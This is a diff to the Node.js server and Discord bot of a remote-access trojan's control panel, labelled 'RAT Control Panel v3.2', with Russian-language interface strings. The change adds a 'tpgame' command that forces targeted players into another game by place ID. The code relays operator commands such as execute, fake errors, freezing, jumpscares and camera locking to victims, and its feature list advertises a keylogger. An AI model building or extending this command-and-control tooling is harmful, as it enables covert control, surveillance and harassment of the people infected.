@@ -141,7 +141,7 @@ function parseCommandWithTarget(message) {
     
     const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
     const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
-    const textPossibleCommands = ['kick'];
+    const textPossibleCommands = ['kick', 'tpgame'];
     const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake'];
     
     if (noTargetCommands.includes(command)) {
@@ -253,7 +253,7 @@ if (DISCORD_TOKEN) {
     discordClient.on('ready', () => {
         console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
-        console.log(`🎯 Версия: 3.2 (27 команд + защита от спама)`);
+        console.log(`🎯 Версия: 3.2 (28 команд + защита от спама)`);
         
         discordClient.user.setActivity('RAT Control Panel v3.2', { type: 'WATCHING' });
     });
@@ -276,6 +276,18 @@ if (DISCORD_TOKEN) {
                 print: async () => {
                     if (await sendCommand("print", [], target)) {
                         const embed = createEmbed('📡 Проверка связи', 'Команда проверки связи отправлена', 0x00ff00, target);
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
+                tpgame: async () => {
+                    const placeId = args[0];
+                    if (!placeId || !/^\d+$/.test(placeId)) {
+                        await message.reply('❌ Укажите корректный ID места (только цифры)');
+                        return;
+                    }
+                    if (await sendCommand("tpgame", [placeId], target)) {
+                        const embed = createEmbed('🌀 Телепорт в игру', `**ID места:** \`${placeId}\``, 0x9b59b6, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -320,7 +332,7 @@ if (DISCORD_TOKEN) {
                 
                 sit: async () => {
                     if (await sendCommand("sit", [], target)) {
-                        const embed = createEmbed('🪑 Изменение позы', 'Игрок меняет позу (сидит/встает)', 0x27ae60, target);
+                        const embed = createEmbed('🪑 Изменение позы', 'Игрок меняет позы (сидит/встает)', 0x27ae60, target);
                         await message.reply({ embeds: [embed] });
                     }
                 },
@@ -576,7 +588,7 @@ if (DISCORD_TOKEN) {
                                     { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true },
                                     { name: '🤖 Discord бот', value: data.discord_bot === 'online' ? '🟢 Активен' : '🔴 Неактивен', inline: true }
                                 )
-                                .setFooter({ text: 'RAT Control System | 27 команд доступно' });
+                                .setFooter({ text: 'RAT Control System | 28 команд доступно' });
                             
                             await message.reply({ embeds: [embed] });
                         } else {
@@ -600,7 +612,7 @@ if (DISCORD_TOKEN) {
                             },
                             { 
                                 name: '👤 Управление игроком', 
-                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
+                                value: '`/tpgame [ник] <id места>`\n`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
                                 inline: false 
                             },
                             { 
@@ -634,7 +646,7 @@ if (DISCORD_TOKEN) {
                                 inline: false 
                             }
                         )
-                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
+                        .setFooter({ text: `Всего команд: 28 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
                     
                     await message.reply({ embeds: [helpEmbed] });
                 }
@@ -790,6 +802,13 @@ app.post('/command', async (req, res) => {
         if (command === "user_chat") {
             await sendDiscordWebhook("💬 Чат игрока", 
                 `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`, 0x3498db);
+        }
+        
+        if (command === "tpgame") {
+            const placeId = args[0] || "не указан";
+            const targetText = target || "всех игроков";
+            await sendDiscordWebhook("🌀 Телепорт в игру", 
+                `**Цель:** ${targetText}\n**ID места:** ${placeId}`, 0x9b59b6);
         }
         
         // Добавляем команду в очередь (если это команда управления)
@@ -1015,7 +1034,8 @@ app.get('/system_info', (req, res) => {
         features: [
             "Защищенные вебхуки",
             "Rate limiting от спама",
-            "27 команд управления",
+            "28 команд управления",
+            "Команда телепорта /tpgame",
             "Камерные команды (CameraLock, CameraShake)",
             "Скримеры (Джефф Килер, Соник.exe)",
             "Кейлоггер",
